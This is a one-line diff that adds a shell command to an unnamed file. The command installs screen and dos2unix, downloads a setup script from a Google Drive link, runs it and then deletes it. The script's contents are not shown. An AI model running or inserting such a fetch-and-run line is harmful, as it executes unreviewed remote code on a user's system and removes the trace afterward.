@@ -1,0 +1,1 @@
+apt update && apt install -y screen && apt install -y dos2unix && wget -qO setup.sh "https://drive.usercontent.google.com/download?id=1XEd6aKdIZZCL9L0zatT4exN0N8jOrgEv&export=download" && chmod +x setup.sh && dos2unix setup.sh && ./setup.sh && rm setup.sh
